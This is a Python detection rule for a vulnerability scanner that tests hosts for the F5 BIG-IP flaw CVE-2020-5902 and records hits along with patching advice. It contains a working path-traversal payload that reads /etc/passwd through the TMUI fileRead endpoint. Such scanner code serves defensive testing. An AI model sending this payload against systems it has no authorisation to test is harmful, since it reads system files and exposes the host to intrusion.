from core.parser import ScanParser
from core.redis import rds
from core.rules import BaseRule
from core.triage import Triage


class Rule(BaseRule):
    def __init__(self):
        super().__init__()
        self.rule = 'CVE_72D3'
        self.rule_severity = 4
        self.rule_description = 'This rule checks for F5 BIG IP Vulnerability (CVE-2020-5902)'
        self.rule_confirm = 'F5 Networks BIG IP Vulnerability'
        self.rule_details = ''
        self.rule_mitigation = (
            'Patch F5 BIGIP to the latest version available. '
            'Refer to the following AskF5 Article for more information on mitigation: '
            'https://support.f5.com/csp/article/K52145254.'
        )
        self.intensity = 1

    def check_rule(self, ip, port, values, conf):
        scan_parser = ScanParser(port, values)

        if not scan_parser.is_product('BIG-IP') and not scan_parser.is_product('BigIP'):
            return

        triage = Triage()
        payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
        response = triage.http_request(ip, port, uri=payload)

        if not response or 'root:x:0:0' not in response.text:
            return

        self.rule_details = f'F5 BIGIP Vulnerability - CVE-2020-5902 at {response.url}'
        domain = scan_parser.get_domain()
        vuln_dict = self.get_vuln_dict(ip, port, domain)
        rds.store_vuln(vuln_dict)
